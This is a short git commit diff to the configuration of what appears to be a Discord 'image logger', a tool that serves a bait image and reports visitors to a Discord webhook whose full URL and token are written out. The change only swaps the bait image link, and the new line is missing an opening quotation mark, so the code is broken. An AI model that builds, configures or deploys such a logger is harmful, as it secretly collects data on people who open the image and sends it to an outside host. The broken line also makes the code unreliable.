423ab09fa0219ae7accdef862bf10a39159621da
timmytuffness200-cmd <timmytuffness200@gmail.com>
2026-07-22 20:24:20 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1529641841987813497/IxSQbDEgnVcwp4NdxDWhEGX1D_yVRRvrZYBBAmou8-Et6QXTmKSyVA0gKkASV-wRkvro",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": https://cdn.wallpapersafari.com/13/42/Nh1vci.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
